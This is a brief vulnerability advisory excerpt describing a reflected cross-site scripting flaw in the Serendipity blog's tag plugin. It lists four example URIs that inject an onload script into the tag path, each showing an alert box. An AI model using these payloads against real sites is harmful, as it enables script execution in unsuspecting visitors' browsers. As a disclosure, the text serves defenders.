An attacker can exploit this issue by enticing an unsuspecting victim to follow a malicious URI.

The following example URIs are available:

http://www.example.com/serendipity/index.php?/plugin/tag/hallo=&gt;&lt;body onload=alert(666)&gt;

http://www.example.com/serendipity/index.php?/plugin/tag/hallo=&gt;&lt;body onload=alert(String.fromCharCode(88,83,83))&gt;

http://www.example.com/serendipity/index.php?/plugin/tag/&lt;body onload=alert(666)&gt;

http://www.example.com/serendipity/index.php?/plugin/tag/&lt;body onload=alert(String.fromCharCode(88,83,83))&gt;
